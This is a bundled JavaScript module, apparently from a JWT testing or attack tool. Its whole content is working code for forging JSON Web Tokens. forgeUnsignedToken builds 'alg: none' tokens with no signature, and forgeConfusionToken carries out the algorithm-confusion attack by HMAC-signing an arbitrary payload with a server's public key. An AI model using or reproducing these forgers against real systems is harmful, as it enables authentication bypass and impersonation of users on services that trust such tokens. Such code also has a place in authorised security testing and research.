//#region src/utils/jwt.js
var encoder = new TextEncoder();
new TextDecoder("utf-8", { fatal: false });
function base64UrlFromBytes(bytes) {
	let binary = "";
	for (let i = 0; i < bytes.length; i += 1) binary += String.fromCharCode(bytes[i]);
	return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
function encodeSegment(value) {
	return base64UrlFromBytes(encoder.encode(JSON.stringify(value)));
}
var HASH_BY_ALG = {
	HS256: "SHA-256",
	HS384: "SHA-384",
	HS512: "SHA-512"
};
var HMAC_BLOCK_BYTES = {
	"SHA-256": 64,
	"SHA-384": 128,
	"SHA-512": 128
};
function hmacKeyBytes(alg, secret) {
	const bytes = encoder.encode(secret);
	if (bytes.length > 0) return bytes;
	return new Uint8Array(HMAC_BLOCK_BYTES[HASH_BY_ALG[alg]]);
}
function webCryptoAvailable() {
	return typeof crypto !== "undefined" && Boolean(crypto.subtle);
}
async function hmacKey(alg, secretBytes) {
	return crypto.subtle.importKey("raw", secretBytes, {
		name: "HMAC",
		hash: HASH_BY_ALG[alg]
	}, false, ["sign"]);
}
async function hmacSign(alg, secret, signingInput) {
	if (!HASH_BY_ALG[alg] || !webCryptoAvailable()) return null;
	try {
		const key = await hmacKey(alg, hmacKeyBytes(alg, secret));
		const signature = await crypto.subtle.sign("HMAC", key, encoder.encode(signingInput));
		return base64UrlFromBytes(new Uint8Array(signature));
	} catch {
		return null;
	}
}
function forgeUnsignedToken(payload, header = {
	alg: "none",
	typ: "JWT"
}) {
	return `${encodeSegment(header)}.${encodeSegment(payload)}.`;
}
async function forgeConfusionToken(payload, publicKey, alg = "HS256") {
	const signingInput = `${encodeSegment({
		alg,
		typ: "JWT"
	})}.${encodeSegment(payload)}`;
	const signature = await hmacSign(alg, publicKey, signingInput);
	if (!signature) return null;
	return `${signingInput}.${signature}`;
}
//#endregion
export { forgeUnsignedToken as a, webCryptoAvailable as c, forgeConfusionToken as i, base64UrlFromBytes as n, hmacKeyBytes as o, encodeSegment as r, hmacSign as s, HASH_BY_ALG as t };
